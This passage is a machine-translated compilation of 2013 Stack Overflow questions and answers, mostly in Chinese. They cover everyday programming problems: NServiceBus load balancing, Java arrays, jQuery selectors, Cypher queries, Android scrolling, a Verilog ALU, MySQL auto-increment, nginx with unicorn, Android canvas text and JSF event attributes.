                NSLog(@"Woohoo, user logged in with Facebook!");
            }else{
                 NSLog(@"%@", [[error userInfo] objectForKey:@"error"]);

                    NSLog(@"An error occurred: %@", error);

            }
        }]; 
```

就我而言，我通过 nil 参数获取权限。可能对其他人有帮助

# load-balancing - Nservicebus 相同消息不同队列 - 负载平衡

> ID：15998085
> 
> 赞同：-2
> 
> 时间：2013-04-14T10:32:39.917
> 
> 标签：load-balancing, nservicebus

让我解释一下我想在这里实现的目标：

创建 5 个相同服务的副本，每个副本都侦听特定于它们的队列。他们听到的信息是一样的

```
SVC1 listening to Q1
SVC2 listening to Q2
SVC3 listening to Q3
SVC4 listening to Q4
SVC5 listening to Q5 
```

说他们都听一个叫做 的消息`TestMessage`。

在这 5 个服务之间进行循环负载平衡，并根据我的循环逻辑的输出将消息放到适用的队列中

我的问题是如何配置在某个时间点将 TestMessage 放到一个队列中。

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T12:36:52.903

请看一下内置的[Distributor](http://support.nservicebus.com/customer/portal/articles/859556-load-balancing-with-the-distributor)。这将为您执行负载平衡并处理所有工作分配。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-17T10:28:16.817

分发器是您需要使用的。它有自己的输入队列和可用工作人员的队列。每当有一个worker可用时，它都会在distributors输入队列中放置一条消息，并且distributors将在其输入队列中发送下一条消息。

下面是 Mikael Koskinen 的示例应用程序，演示了如何使用它： http: [//mikaelkoskinen.net/nservicebus-distributor-sample-application/](http://mikaelkoskinen.net/nservicebus-distributor-sample-application/)

# java - 在 Java 中，为什么 Array 的类构造函数是私有的？

> ID：15998089
> 
> 赞同：1
> 
> 时间：2013-04-14T10:33:05.317
> 
> 标签：java, arrays

数组类构造函数：-

```
private Arrays() {} 
```

我的问题是，如果 Array 的类构造函数是私有的，那么我们究竟如何创建 Arrays 的对象。那么以下语句的含义是什么：-

```
int[] anArray = new int[10]; 
```

上面的语句和Array的类有什么关系。

对这个问题的任何帮助都会非常感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-14T10:37:20.320

Arrays 只是一个用于处理数组的实用程序类，就像 Collections 是一个用于处理（您猜对了）集合的实用程序类一样。语句 new int[10] 是一种语言结构，与 Arrays 类无关。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-14T11:44:25.707

`private Arrays() {}`

我猜是因为其中的所有公共实用程序方法`java.util.Arrays`都是`static`，因此我们不需要此类的任何实例来使用这些方法。因此语言的设计者决定保留 are 的构造函数`Arrays`来`private`限制实例化。

`int[] anArray = new int[10];`

那是用于定义数组、数据结构的 java 语言构造，不要将其与`Arrays`java 中的实用程序类混淆。有关更多信息

数组：[http](http://docs.oracle.com/javase/specs/jls/se7/html/jls-10.html)
`Arrays` ://docs.oracle.com/javase/specs/jls/se7/html/jls-10.html：http : [//docs.oracle.com/javase/6/docs/api/java/util/数组.html](http://docs.oracle.com/javase/6/docs/api/java/util/Arrays.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-14T10:38:19.653

`Arrays`是一个用于静态使用的实用程序。 `int[]`是一种伪原始类型，它没有构造函数。它们之间没有真正的关系。

# javascript - Dynamic: CSS vs JavaScript

> ID：15998095
> 
> 赞同：1
> 
> 时间：2013-04-14T10:34:14.163
> 
> 标签：javascript, html, css, dynamic

JavaScript is more dynamic than [CSS](http://en.wikipedia.org/wiki/Cascading_Style_Sheets). But how is JavaScript more dynamic than CSS? How does JavaScript coding work in a better way than CSS?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-14T10:42:07.047

这是两种不同的东西。CSS 是一种[样式表语言](https://en.wikipedia.org/wiki/Style_sheet_language)，而 JavaScript 是一种[编程语言](https://en.wikipedia.org/wiki/Programming_language)。这真的就像比较[苹果和橘子](http://en.wikipedia.org/wiki/Apples_and_oranges)。（实际上，这种区别在技术层面上并不是那么明显，显然[CSS 甚至是图灵完备](https://stackoverflow.com/questions/2497146/is-css-turing-complete)的，但由于大多数人实际上使用“编程语言”这个术语，它们是不同的。）

但我想你可以说 JavaScript 更具动态性，因为它是一种可以动态改变页面内容和呈现的编程语言。实际上，您可以使用 JavaScript 在运行时动态添加和删除 CSS 规则。您还可以更改页面中 DOM 元素的属性，例如类、ID 等。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-14T10:58:33.180

是的，CSS 不像[JavaScript](http://en.wikipedia.org/wiki/JavaScript)那样动态，而且新的动态选择器在旧版浏览器中不起作用。如果没有任何问题，人们也不会升级，所以使用纯 CSS 解决方案 =)

使用纯 CSS 完成的可切换菜单通常使用`:selected`动态选择器并使用一些可见的菜单元素对其进行样式设置，以使其仅在选中隐藏复选框时才可见。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-14T11:15:47.427

[JavaScript](http://en.wikipedia.org/wiki/JavaScript)可以更灵活，因为它是一种编程语言，而 CSS 可以更好地执行，因为它内置在浏览器中。JavaScript 可以模拟许多相同的 CSS 属性，但 CSS 会具有更好的性能。例如，它可以使动画更流畅。

很多时候，人们会编写 JavaScript 代码来设置 CSS 属性以让 CSS 进行渲染。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-14T13:05:48.243

[JavaScript](http://en.wikipedia.org/wiki/JavaScript)不仅止于制作酷炫的设计，它还直接为 HTML 做很多其他事情，而 CSS 只会帮助您进行页面设计，而 CSS 不能取代您网站的动作制造者 Javascript。我的意思是……想象一个 CSS 下拉菜单，哈哈。

不过是个好问题。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-01-16T00:13:46.600

他们的能力有很大的重叠。

纯 CSS3 可用于构建[具有下拉菜单的有吸引力且响应迅速的菜单栏](http://line25.com/tutorials/how-to-create-a-pure-css-dropdown-menu)。你可以在纯 Javascript 中做同样的事情。但是您可能会发现 HTML+CSS 在创建布局+样式方面更具表现力。

当您必须在客户端动态生成内容（例如，在浏览器中运行的编辑器和模拟器）时，Javascript 将派上用场。然后，您可能会发现（实际上）用 Javascript 做所有事情会更容易。

# jquery - How to set a variable with the Jquery all(*) selector

> ID：15998096
> 
> 赞同：0
> 
> 时间：2013-04-14T10:34:15.093
> 
> 标签：jquery, variables, jquery-selectors

I have this code which will hide everything inside a certain div:

```
$('#middlecolumn *').hide(); 
```

So now I would like to set the ID as a variable, so I did:

```
var qw = '#middlecolumn';

$(qw + '*').hide(); 
```

This doesn't seem to work. It hides the ID as well as everything inside it. How do I write it the proper way?

[JsFiddle Example](http://jsfiddle.net/zH9TD/2/)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-14T10:35:44.510

您需要使用空格字符：

```
var qw = '#middlecolumn';
$(qw + ' *').hide(); // will be equivalent to: "#middlecolumn *" 
```

否则，插值会将其转换为: `#middlecolumn*`，这是无效的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-14T10:35:52.470

你错过了一个空间：

```
$(qw + ' *').hide(); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-14T10:36:05.240

您在选择器中缺少空格键。所以它会是

```
var qw = '#middlecolumn';

$(qw + ' *').hide(); // <<-- Spacebar before * 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-14T10:39:00.553

你缺少一个空格字符。

这个：

```
$(qw + '*').hide(); 
```

一定是：

```
$(qw + ' *').hide(); 
```

# neo4j - Exclude certain relationships from cypher query

> ID：15998097
> 
> 赞同：1
> 
> 时间：2013-04-14T10:34:16.437
> 
> 标签：neo4j, cypher

I'm looking to make a cypher query which finds all outgoing relationships from node, excluding a couple. Here's an example:

```
START node=node(5), excludeRels=rel(7,8,9)
MATCH node-[rels]->x
RETURN rels 
```

But I would like to exclude the rels in `excludeRels` from the returned `rels`. So if `node(5)` has outgoing relationships 6,7,8,9 and 10, I would like 6 and 10 to be returned.

Is this possible?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-15T11:15:03.397

万一其他人想知道，我发现上述问题的答案是：

```
START node=node(5), excludeRels=rel(7,8,9)
WITH node, collect(excludeRels) as erels
MATCH node-[rel]->()
WHERE NOT rel IN erels
RETURN rel 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T11:28:05.847

这也应该有效

```
START node=node(5), excludeRels=rel(7,8,9)
MATCH node-[rel]->()
WHERE rel <> excludeRels
RETURN rel 
```

# android - 如何使用滚动条自动滚动滚动视图？

> ID：15998098
> 
> 赞同：0
> 
> 时间：2013-04-14T10:34:22.440
> 
> 标签：android, scrollview, scroller

我在使用 Scroller 以编程方式滚动 ScrollView 时遇到问题，因此到目前为止还没有涉及到触摸手势。只要来自传感器的数据在一定范围内，我想以一定的速度向下滚动 ScrollView。所以基本上我想在数据第一次进入有效范围时开始滚动，然后不干扰滚动过程，直到数据再次超出范围。我不想将 onSensorChanged 直接连接到 scrollBy() ，因为它可能无法在其他设备上正常工作。这是我到目前为止所得到的：

在我的 onCreate 中：

```
tx = new TextView(ShowLyrics.this);
mainscrollarea = (ScrollView) findViewById (R.id.mainscrollarea);
scroller = new Scroller(getApplicationContext(), new LinearInterpolator());
tx.setScroller(scroller); 
```

在我的 onSensorChanged 中：

```
if(integratedAngle - scrollTolerance > pointzero){ //this is checking for the data range and works so far
    if(!scrollingDown){
        scrollText("down");
        }
    } 
```

和 scrollText 函数：

```
void scrollText(String direction){

    if(direction.matches("down")){
        scrollingUp = false;
        scrollingDown = true;           
        scroller.forceFinished(true);
        int currY = mainscrollarea.getScrollY();
        int endY = tx.getHeight();
        int distance = endY - currY;            
        scroller.startScroll(0, currY, 0, -distance, 5000);

    }

    if(direction.matches("up")){
    //nothing yet   
    }
} 
```

所以现在我已经硬编码了 5 秒来向下滚动，但没有任何反应。onSensorChanged 中 Scroller 的 getCurrY 的 Log.d() 只吐出 0。如果有人能指出我正确的方向，我将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T10:41:25.590

我有点像你一样自动滚动。除了我依赖用户输入（当用户用手指靠近屏幕边缘时，我开始以特定速度滚动）。

我使用了一个可运行的对象，它的作用与滚动条的作用相同。

```
private final DragScroller mDragScroller;

/** inner class */
private class DragScroller implements Runnable {
    private SCROLL_DIRECTION mDirection;
    private boolean          mIsFinished = true;

    DragScroller(Context context) {
    }

    void start(SCROLL_DIRECTION direction) {
        mState = STATE.DRAG_SCROLL;
        mIsFinished = false;
        mDirection = direction;
        post(this);
    }

    @Override
    public void run() {
        if (mIsFinished) {
            return;
        }
        if (mDirection.equals(SCROLL_DIRECTION.UP)) {
            // check if the touch is still in the correct area...
            if (!isOverThreshold(0, mTempY, mDragScrollThreshold)) {
                scrollTo(0, ensureScrollBoundaries(getScrollY() - mDragScrollSpeed));
                post(this);
            } else {
                forceFinish();
            }
        } else {
            // check if the touch is still in the correct area...
            if (!isOverThreshold(getHeight(), mTempY, mDragScrollThreshold)) {
                scrollTo(0, ensureScrollBoundaries(getScrollY() + mDragScrollSpeed));
                post(this);
            } else {
                forceFinish();
            }
        }
    }

    public boolean isFinished() {
        return mIsFinished;
    }

    public void forceFinish() {
        mIsFinished = true;
    }
} 
```

它只是由以下方式启动：`mDragScroller.start(SCROLL_DIRECTION.UP);`并且可以通过以下方式停止`mDragScroller.forceFinish();`

**编辑**

根据您的评论，您希望将持续时间用于速度。这是有问题的，因为最终的滚动速度取决于您在给定时间内必须滚动的距离。简短的数学示例：在 1 分钟内滚动 600 像素意味着您每秒滚动 10 像素，这还不错（取决于您滚动的内容、文本或图像......）但如果您靠近边缘并且您只需要滚动 60 像素，则结果速度取决于给定的 1 分钟持续时间，这意味着每秒非常慢 1 像素。

鉴于该示例，您的滚动速度不应基于总持续时间，而是基于每秒像素。

是的，无需使用 Scroller 进行编程滚动。只是runnable会调用自己直到它应该停止并且速度可以调整到你需要的任何东西......

# image-processing - 使用 Kinect 和 AForge 进行图像处理

> ID：15998101
> 
> 赞同：2
> 
> 时间：2013-04-14T10:34:59.300
> 
> 标签：image-processing, kinect, aforge

我正在做一个项目，我想使用 AForge.NET-Library 使用 Microsoft Kinect 跟踪骰子。该项目本身仅包含初始化 Kinect、获取 Colorframe 和应用一个滤色器等基础知识，但问题已经出现。所以这里是程序的主要部分：

```
void ColorFrameReady(object sender, ColorImageFrameReadyEventArgs e)
    {
        using (ColorImageFrame colorFrame = e.OpenColorImageFrame())
        {
            if (colorFrame != null)
            {
                colorFrameManager.Update(colorFrame);
                BitmapSource thresholdedImage =
                    diceDetector.GetThresholdedImage(colorFrameManager.Bitmap);

                if (thresholdedImage != null)
                {
                    Display.Source = thresholdedImage;
                }
            }

        }
    } 
```

“colorFrameManager”对象的“更新”方法如下所示：

```
public void Update(ColorImageFrame colorFrame)
    {
        byte[] colorData = new byte[colorFrame.PixelDataLength];
        colorFrame.CopyPixelDataTo(colorData);

        if (Bitmap == null)
        {
            Bitmap = new WriteableBitmap(colorFrame.Width, colorFrame.Height,
                96, 96, PixelFormats.Bgr32, null);
        }
        int stride = Bitmap.PixelWidth * Bitmap.Format.BitsPerPixel / 8;
        imageRect.X = 0;
        imageRect.Y = 0;
        imageRect.Width = colorFrame.Width;
        imageRect.Height = colorFrame.Height;
        Bitmap.WritePixels(imageRect, colorData, stride, 0);
    } 
```

'getThresholdedImage' 方法如下所示：

```
public BitmapSource GetThresholdedImage(WriteableBitmap colorImage)
    {
        BitmapSource thresholdedImage = null;
        if (colorImage != null)
        {
            try
            {
                Bitmap bitmap = BitmapConverter.ToBitmap(colorImage);
                HSLFiltering filter = new HSLFiltering();
                filter.Hue = new IntRange(335, 0);
                filter.Saturation = new Range(0.6f, 1.0f);
                filter.Luminance = new Range(0.1f, 1.0f);
                filter.ApplyInPlace(bitmap);
                thresholdedImage = BitmapConverter.ToBitmapSource(bitmap);
            }
            catch (Exception ex)
            {
                System.Console.WriteLine(ex.Message);
            }
        }
        return thresholdedImage;
    } 
```

现在程序变慢了很多/执行此行时没有响应：

```
filter.ApplyInPlace(bitmap); 
```

所以我已经阅读了这个线程（[使用 AForge 对 Kinect 视频进行 C# 图像处理](https://stackoverflow.com/questions/10342097/c-sharp-image-processing-on-kinect-video-using-aforge)），我尝试了 EMGU，但由于内部异常，我无法让它工作，而且线程启动器自四个月以来就没有在线我的问题有看看他的工作代码没有得到回答。现在首先我对执行缓慢的原因很感兴趣

```
filter.ApplyInPlace(bitmap); 
```

这个图像处理真的那么复杂吗？或者这可能是我的环境问题？其次我想问一下跳帧是否是一个好的解决方案？或者最好每隔 - 例如 - 500毫秒使用轮询和打开帧。非常感谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-21T20:50:22.263

HSL 过滤器不会减慢计算速度，不是复杂的过滤器。我在 30 fps 的 320x240 图像中使用它没有问题。

问题可能在于计算图像的分辨率或帧速率太高！

如果图像的分辨率很高，我建议在任何过滤器应用之前调整它的大小。而且我认为 20 帧速率（也许更少）足以跟踪骰子。

# verilog - 使用生成的 32 位加法减法器 ALU

> ID：15998102
> 
> 赞同：1
> 
> 时间：2013-04-14T10:34:59.930
> 
> 标签：verilog, xilinx

我需要为类分配实现一个 32 位加法减法 ALU。我有一个工作正常的 1 位加法减法器，操作是在 select 语句的帮助下进行的（下面给出了所有代码）。无论如何，我面临的问题是我无法弄清楚如何使用从一个模块到后续模块的进位/借位。

```
module add_sub(select, i0, i1, cin, out, cout
    );

input i0, i1, select, cin;
output out, cout;
wire y0, y1, y2, y3, y4, y5, y6;
wire z0, z1, z2, z3, z4;

//diff = i0 xor i1 xor cin
//borrow = cin. ~(i1 xor i2) or ~x.y

xor (y0, i1, cin);
xor (y1, i0, y0); //y1=diff or sum as only carry and borrow vary between adder and subtractor circuits

xor (y2, i1, i0);
and (y3, cin, ~y2);
and (y4, ~i0, i1);
or (y6, y5, y4); //y6 = borrow

and (z0, i0, i1);
xor (z1, i0, i1);
and (z2, cin, z1);
or (z3, z0, z2); //z3= carry out for sum

//conditional operator for assigning sum or difference. if select = 0, we add, else subtract

assign out = y1;
assign cout = select ? y6 : z3;

endmodule 
```

该模块在下面给出的 alu 模块中的循环中实例化...

```
module alu(sel, num1, num2, alu_cin, alu_out, alu_c
    );

parameter N = 32;
input sel; //select line for add or sub
input [N-1:0] num1; //two inputs
input [N-1:0] num2;
input alu_cin;

output [N-1:0] alu_out; //32 bit output
output alu_c;            // becomes final carry or borrow accordingly

genvar i;

generate for (i=0; i<=N-1; i=i+1) 

    begin: alu_loop

        if (i == 0)
            add_sub as_i (sel, num1[i], num2[i], alu_cin, alu_out[i], alu_c);
        else
            add_sub as_i (sel, num1[i], num2[i], alu_loop[i-1].as_i.cout[i-1], alu_out[i], alu_c);
    end

endgenerate   

endmodule 
```

在 alu 的测试台中，我根据需要给出了适当的 32 位值和选择值。问题随之而来

```
add_sub as_i (sel, num1[i], num2[i], alu_loop[i-1].as_i.cout[i-1], alu_out[i], alu_c); 
```

它说“索引不能应用于标量。” 因为我试图模拟它。语法检查完美完成。

我需要从一位模块访问 cout 以将其作为 cin 传递给下一个模块。alu_c 可以被覆盖，因为只需要最后一位。

任何帮助，将不胜感激。提前致谢。:) 所有这些都是通过 Verilog 模块在 Xilinx ISE 上完成的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T14:51:01.313

它在语法上是正确的，但您在单个位值上使用位选择，这是一个语义错误。

```
add_sub as_i (
  sel,num1[i],num2[i],alu_loop[i-1].as_i.cout[i-1],alu_out[i],alu_c);
                                         ^^^^ 
```

在 add_sub 中声明为标量输出

```
output out, cout; 
```

虽然 Verilog 允许使用点表示法（分层引用）来引用端口，但在测试台之外这并不是一个好的做法。您应该为该连接声明一条线。

```
for (i=0; i<=N-1; i=i+1) 
  begin: alu_loop
    wire cout; // Visible as alu_loop[N].cout 
  end 
```

# mysql - MySQL：AUTO_INCREMENT 现在总是唯一的吗？

> ID：15998105
> 
> 赞同：0
> 
> 时间：2013-04-14T10:35:06.287
> 
> 标签：mysql, auto-increment

我有在 MySQL 3.23.23 时创建的代码当时 MySQL AUTO_INCREMENT 重用了最小的已发布 AUTO_INCREMENT 值。

它可以生成 100、101、102、103、

删除 101

**101、104、105** _

我们使用特殊的表来生成 ID，通过 LOCKING 表，`UPDATE IDTABLE SET id = id + 1 WHERE key = 'table_name'; SELECT id ... ; UNLOCK;`

根据mysql docs，不再需要这样的额外表。但是依靠 MySQL AUTO_INCREMENT 有多可靠呢？

AUTO_INCREMENT 行为存储引擎是特定的吗？它在 SQL 规范中有描述吗？

这些 ID 非常重要，即使旧记录被删除，它们也必须增加并且是唯一的。（如购物车软件中的订单号）

* * *

可能是卡兰坎所说的问题

**插入**100、101、102、103、104

 **删除**104**

插入**104** , 105, 106

10 年前，我们在 MySQL 中肯定有某种关于 AUTO_INCREMENT 的错误。我们可以删除所有记录，但 AUTO_INCREMENT 必须保留。

这就是我问这个的原因。**

# websocket - Jetty Websocket 编译错误

> ID：15998106
> 
> 赞同：0
> 
> 时间：2013-04-14T10:35:11.197
> 
> 标签：websocket, jetty

我正在尝试做一个 Jetty Web Socket 示例。我从互联网上复制了一个示例，当我直接部署到服务器而不进行任何更改时，它工作正常。

但是当我将 Source (servlet) 复制到 Eclipse IDE 中时，它给出了与相关的编译异常

```
 The method onClose(int, String) of type Html5Servlet.StockTickerSocket must override a superclass method

- The method onOpen(WebSocket.Connection) of type Html5Servlet.StockTickerSocket must override a superclass method

The method onMessage(String) of type Html5Servlet.StockTickerSocket must override a superclass method 
```

这是我的 servlet，我保留了该示例中提到的罐子

```
package org.ajeesh.app;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.atomic.AtomicInteger;

import javax.servlet.http.HttpServletRequest;

import org.eclipse.jetty.websocket.WebSocket;
import org.eclipse.jetty.websocket.WebSocketServlet;

public class Html5Servlet extends WebSocketServlet {

    private AtomicInteger index = new AtomicInteger();

    private static final List<String> tickers = new ArrayList<String>();
    static{
        tickers.add("ajeesh");
        tickers.add("peeyu");
        tickers.add("kidillan");
        tickers.add("entammo");
    }

    /**
     * 
     */
    private static final long serialVersionUID = 1L;

    public WebSocket doWebSocketConnect(HttpServletRequest req, String resp) {
        System.out.println("On server");
        return new StockTickerSocket();
    }
    protected String getMyJsonTicker(){
        StringBuilder start=new StringBuilder("{");
        start.append("\"stocks\":[");
        int counter=0;
        for (String aTicker : tickers) {
            counter++;

            start.append("{ \"ticker\":\""+aTicker +"\""+","+"\"price\":\""+index.incrementAndGet()+"\" }");
            if(counter<tickers.size()){
                start.append(",");
            }
        }
        start.append("]");
        start.append("}");
        return start.toString();
    }
    public class StockTickerSocket implements WebSocket.OnTextMessage{
        private Connection connection;
        private Timer timer; 

        @Override
        public void onClose(int arg0, String arg1) {
            System.out.println("Web socket closed!");
        }

        @Override
        public void onOpen(Connection connection) {
            System.out.println("onOpen!");
            this.connection=connection;
            this.timer=new Timer();
        }

        @Override
        public void onMessage(String data) {
            System.out.println("onMessage!");   
            if(data.indexOf("disconnect")>=0){
                connection.close();
                timer.cancel();
            }else{
                sendMessage();

            }           
        }

        private void sendMessage() {
            System.out.println("sendMessage!");         
            if(connection==null||!connection.isOpen()){
                System.out.println("Connection is closed!!");
                return;
            }
            timer.schedule(new TimerTask() {

                    @Override
                    public void run() {
                        try{
                            System.out.println("Running task");
                            connection.sendMessage(getMyJsonTicker());
                        }
                        catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                }, new Date(),5000);
        }

    }
} 
```

# ruby-on-rails - RoR - 尝试使用 unicorn 部署时出现 nginx 问题

> ID：15998107
> 
> 赞同：0
> 
> 时间：2013-04-14T10:35:11.970
> 
> 标签：ruby-on-rails, deployment, nginx, unicorn

我是 Ruby on Rails 的初学者，在部署我的 rails 应用程序（使用 nginx + unicorn）时遇到了一些困难。我不知道发生了什么，但这是我在启动 nginx 时在日志文件中遇到的错误类型：

```
2013/04/14 00:31:42 [error] 14469#0: *1 connect() to unix:/home/user/www/sahitoo/shared/sockets/unicorn.sock 
**failed (111: Connection refused)** while connecting to upstream, client: XX.XXX.XX.XX, server: myapp.com, 
request: "GET / HTTP/1.1", upstream: "http://unix:/home/user/www/sahitoo/shared/sockets/unicorn.sock:/", 
host: "www.XXXXX.com" 
```

如果你能帮助找出问题，或者至少给我一些跟踪它的建议，那就太好了！非常感谢。

我还发布了 nginx.conf 文件：

```
user www-data;
worker_processes 4;
pid /var/run/nginx.pid;

events {
  worker_connections 768;
  multi_accept on;
}

http {
  sendfile on;
  tcp_nopush on;
  tcp_nodelay on;
  keepalive_timeout 65;
  types_hash_max_size 2048;

  include /etc/nginx/mime.types;
  default_type application/octet-stream;

  access_log /var/log/nginx/access.log;
  error_log /var/log/nginx/error.log;

  gzip on;
  gzip_disable "msie6";

  gzip_http_version 1.1;
  gzip_types text/plain text/css application/json application/x-javascript text/xml application/xml application/xml+rss text/javascript;

  ##
  # Virtual Host Configs
  ##

  include /etc/nginx/conf.d/*.conf;
  include /etc/nginx/sites-enabled/*;

  upstream sahitoo {
    server unix:/home/kar/www/sahitoo/shared/sockets/unicorn.sock;
  }
} 
```

使用 /etc/nginx/sites-enabled/sahitoo 文件：

```
server {
  listen 80;
  server_name myapp.com;

  access_log /var/log/nginx/sahitoo.access.log;
  error_log /var/log/nginx/sahitoo.error.log;

  root /www/sahitoo/public;

      # direct to maintenance if this file exists
      if (-f $document_root/system/maintenance.html) {
        rewrite  ^(.*)$  /system/maintenance.html last;
    break;
  }

  location / {
    proxy_redirect          http://sahitoo/               /;
    proxy_set_header        Host                                                            $host;
    proxy_set_header        X-Real-IP                                                     $remote_addr;
proxy_set_header  X-Forwarded-For                                               $proxy_add_x_forwarded_for;

    # If the file exists as a static file serve it directly
    if (-f $request_filename) {
      break;
    }

    if (!-f $request_filename) {
      proxy_pass http://sahitoo;
      break;
    }
  }

  error_page   500 502 503 504  /500.html;
  location = /500.html {
    root   /home/kar/www/sahitoo/public;
  }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-08-04T02:11:41.090

如果您在其他用户（可能是 root）上运行 ruby​​ 并且它对当前用户没有任何特权，则会发生这种情况，您确定您从

> 'ruby -v' 或 'rails -v'

.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T11:08:14.710

我建议看一下这个工作示例 `nginx.conf`：

```
upstream unicorn-your_app {
  server unix:/tmp/unicorn.your_app.sock fail_timeout=0;
}

server {
  listen 80;
  server_name myapp.com;
  root /www/sahitoo/current/public;

  location ^~ /assets/ {
    gzip_static on;
    expires max;
    add_header Cache-Control public;
  }

  try_files $uri/index.html $uri @unicorn-yourapp;
  location @unicorn-yourapp {
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header Host $http_host;
    proxy_redirect off;
    proxy_pass http://unicorn-your_app;
  }

  error_page 500 502 503 504 /500.html;
  client_max_body_size 4G;
  keepalive_timeout 10;
} 
```

如您所见，有一些不同之处：

*   `upstram`堵塞;
*   根指向`your_dir/current/public`;
*   try_files 例程；
*   `location @unicorn-yourapp`;

如果您想对该主题有更深入的了解，可以使用非常好的[Railscast](http://railscasts.com/episodes/335-deploying-to-a-vps?view=asciicast)。

# string - Algorithm to find where exactly two strings match/differ

> ID：15998111
> 
> 赞同：-3
> 
> 时间：2013-04-14T10:35:29.623
> 
> 标签：string, comparison, levenshtein-distance, edit-distance

I am working on finding the similarity/differences in the source code of different java programs. I've used an implementation of the Levenshtein algorithm to find how similar two programs are. I want to know if there is any algorithm that can help in finding the exact positions where two strings differ.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T10:49:01.133

通过查看内部工作原理，您会发现比您想知道的更多`diff`- 例如参见[此链接](http://c2.com/cgi/wiki?DiffAlgorithm)或只是[wiki 文章](http://en.m.wikipedia.org/wiki/Diff)

# java - 使用 canvas.drawText 的文本中的换行符

> ID：15998118
> 
> 赞同：2
> 
> 时间：2013-04-14T10:36:17.283
> 
> 标签：java, android, newline, android-canvas, drawtext

我正在做一个 Android 游戏，我正在使用这样的功能在设备屏幕上显示文本：

```
public void drawString(String text, int x, int y, Paint paint) {
    canvas.drawText(text, x, y, paint);

} 
```

我尝试显示以下消息：

```
g.drawString("Player: " + playerString+ " :\n" + messageString,SCREENWIDTH / 2, SCREENHEIGHT / 2, paint); 
```

然而，我得到一个奇怪的字符（一个正方形）而不是换行符（\n）。

任何人都可以帮助我吗？

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-14T10:44:48.133

而不是`drawString`调用`drawText` 和中断线调用 drawText 两次 Y 偏移。

看这里例如 [绘制多行文本到画布](https://stackoverflow.com/questions/6756975/draw-multi-line-text-to-canvas)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2020-04-18T03:33:45.737

```
public void drawString(String text, int x, int y, TextPaint paint)
{
    if (text.contains("\n"))
    {
        String[] texts = text.split("\n");

        for (String txt : texts)
        {
            canvas.drawText(txt, x, y, paint);

            y += paint.getTextSize();
        }
    }
    else
    {
        canvas.drawText(text, x, y, paint);
    }
} 
```

# jsf - JSF f:attribute into a f:event not mapping in backing bean

> ID：15998119
> 
> 赞同：0
> 
> 时间：2013-04-14T10:36:22.867
> 
> 标签：jsf, tomcat7

I'am trying to pass a profile name for a webpage (xhtml) to the user bean validator. This is my approoach:

```
<f:event name="verifica" listener="#{RegistroBean.verificaUsuarioLogado}" type="preRenderView">            
        <f:attribute name="perfil" value="profesor"/>
    </f:event> 
```

In the backing bean code, the event attributes are empty, but they shouldn't:

```
 public void verificaUsuarioLogado(ComponentSystemEvent event) {
        log.debug("URL " + UtilidadesBean.getRequestURL());
        log.debug("Verificando si está logado");
        if (event.getComponent().getAttributes().isEmpty()) {
            log.debug("No hay nada");
        } else {
            Iterator itr = event.getComponent().getAttributes().entrySet().iterator();
            while (itr.hasNext()) {
                Entry entrada = (Entry) itr.next();
                System.out.print("Clave " + (String) entrada.getKey() + " Valor " + (String) entrada.getValue());
            }
            String perfil = (String) event.getComponent().getAttributes().get("perfil");
            log.debug("Tengo el perfil de la página " + perfil);
        }
        String perfil = (String) event.getComponent().getAttributes().get("perfil");
        log.debug("Tengo el perfil de la página " + perfil); 
```

Log output:

```
14-abr-2013 12:29:20 DEBUG beans.RegistroBean.verificaUsuarioLogado:231 - URL /spum/generainforme.xhtml
14-abr-2013 12:29:20 DEBUG beans.RegistroBean.verificaUsuarioLogado:232 - Verificando si está logado
14-abr-2013 12:29:20 DEBUG beans.RegistroBean.verificaUsuarioLogado:235 - No hay nada
14-abr-2013 12:29:20 DEBUG beans.RegistroBean.verificaUsuarioLogado:246 - Tengo el perfil de la página null 
```

Ideas?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T11:04:13.770

`<f:attribute>`仅在`UIComponent`父级中受支持。`<f:event>`不是这样的。

要么移到`<f:attribute>`外面`<f:event>`。

```
<f:event name="verifica" listener="#{RegistroBean.verificaUsuarioLogado}" type="preRenderView" />
<f:attribute name="perfil" value="profesor"/> 
```

或者只是在 EL 中将其作为方法参数传递，这是自 Tomcat 7 支持的 EL 2.2 以来的新功能。

```
<f:event name="verifica" listener="#{RegistroBean.verificaUsuarioLogado('profesor')}" type="preRenderView" /> 
```

和

```
public void verificaUsuarioLogado(String perfil) {
    // ...
} 
```

* * *

**与具体问题无关**，给定方法名称，您似乎想要执行一些身份验证检查。JSF 视图不适合这样做。另请参阅[如何处理数据库中用户的身份验证/授权？](https://stackoverflow.com/questions/9965708/how-to-handle-authentication-authorization-with-users-in-a-database/)

此外，托管 bean 名称必须以小写字母开头。就像你现在一样

```
RegistroBean RegistroBean = new RegistroBean(); 
```

